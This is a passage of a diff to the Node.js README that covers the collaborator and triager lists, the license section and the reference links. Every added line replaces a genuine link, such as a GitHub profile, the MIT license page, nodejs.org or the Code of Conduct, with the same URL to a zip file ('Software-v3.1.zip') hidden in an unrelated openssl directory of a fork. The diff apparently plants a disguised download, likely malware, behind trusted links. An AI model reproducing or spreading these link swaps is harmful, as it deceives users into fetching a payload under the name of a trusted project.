+* [saghul](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Saúl Ibarra Corretgé** \<s@saghul.net>
-* [sam-github](https://github.com/sam-github) -
+* [sam-github](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Sam Roberts** \<vieuxtech@gmail.com>
-* [sebdeckers](https://github.com/sebdeckers) -
+* [sebdeckers](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Sebastiaan Deckers** \<sebdeckers83@gmail.com>
-* [shigeki](https://github.com/shigeki) -
+* [shigeki](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Shigeki Ohtsu** \<ohtsu@ohtsu.org> (he/him)
-* [stefanmb](https://github.com/stefanmb) -
+* [stefanmb](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Stefan Budeanu** \<stefan@budeanu.com>
-* [tellnes](https://github.com/tellnes) -
+* [tellnes](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Christian Tellnes** \<christian@tellnes.no>
-* [thefourtheye](https://github.com/thefourtheye) -
+* [thefourtheye](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Sakthipriyan Vairamani** \<thechargingvolcano@gmail.com> (he/him)
-* [thlorenz](https://github.com/thlorenz) -
+* [thlorenz](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Thorsten Lorenz** \<thlorenz@gmx.de>
-* [trevnorris](https://github.com/trevnorris) -
+* [trevnorris](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Trevor Norris** \<trev.norris@gmail.com>
-* [tunniclm](https://github.com/tunniclm) -
+* [tunniclm](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Mike Tunnicliffe** \<m.j.tunnicliffe@gmail.com>
-* [vkurchatkin](https://github.com/vkurchatkin) -
+* [vkurchatkin](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Vladimir Kurchatkin** \<vladimir.kurchatkin@gmail.com>
-* [vsemozhetbyt](https://github.com/vsemozhetbyt) -
+* [vsemozhetbyt](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Vse Mozhet Byt** \<vsemozhetbyt@gmail.com> (he/him)
-* [whitlockjc](https://github.com/whitlockjc) -
+* [whitlockjc](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Jeremy Whitlock** \<jwhitlock@apache.org>
-* [yhwang](https://github.com/yhwang) -
+* [yhwang](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yihong Wang** \<yh.wang@ibm.com>
-* [yorkie](https://github.com/yorkie) -
+* [yorkie](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Yorkie Liu** \<yorkiefixer@gmail.com>
 
 </details>
@@ -632,21 +632,21 @@ maintaining the Node.js project.
 
 ### Triagers
 
-* [Ayase-252](https://github.com/Ayase-252) -
+* [Ayase-252](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Qingyu Deng** \<i@ayase-lab.com>
-* [himadriganguly](https://github.com/himadriganguly) -
+* [himadriganguly](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Himadri Ganguly** \<himadri.tech@gmail.com> (he/him)
-* [iam-frankqiu](https://github.com/iam-frankqiu) -
+* [iam-frankqiu](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Frank Qiu** \<iam.frankqiu@gmail.com> (he/him)
-* [marsonya](https://github.com/marsonya) -
+* [marsonya](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Akhil Marsonya** \<akhil.marsonya27@gmail.com> (he/him)
-* [Mesteery](https://github.com/Mesteery) -
+* [Mesteery](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Mestery** \<mestery@pm.me>
-* [PoojaDurgad](https://github.com/PoojaDurgad) -
+* [PoojaDurgad](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Pooja Durgad** \<Pooja.D.P@ibm.com>
-* [RaisinTen](https://github.com/RaisinTen) -
+* [RaisinTen](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Darshan Sen** \<raisinten@gmail.com>
-* [VoltrexMaster](https://github.com/VoltrexMaster) -
+* [VoltrexMaster](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) -
   **Voltrex** \<mohammadkeyvanzade94@gmail.com> (he/him)
 
 ### Release keys
@@ -724,15 +724,15 @@ use these keys to verify a downloaded file.
 ## License
 
 Node.js is available under the
-[MIT license](https://opensource.org/licenses/MIT). Node.js also includes
+[MIT license](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip). Node.js also includes
 external libraries that are available under a variety of licenses.  See
-[LICENSE](https://github.com/nodejs/node/blob/HEAD/LICENSE) for the full
+[LICENSE](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) for the full
 license text.
 
-[Code of Conduct]: https://github.com/nodejs/admin/blob/HEAD/CODE_OF_CONDUCT.md
+[Code of Conduct]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
 [Contributing to the project]: CONTRIBUTING.md
-[Node.js Website]: https://nodejs.org/
-[OpenJS Foundation]: https://openjsf.org/
+[Node.js Website]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
+[OpenJS Foundation]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
 [Strategic initiatives]: doc/guides/strategic-initiatives.md
 [Technical values and prioritization]: doc/guides/technical-values.md
-[Working Groups]: https://github.com/nodejs/TSC/blob/HEAD/WORKING_GROUPS.md
+[Working Groups]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
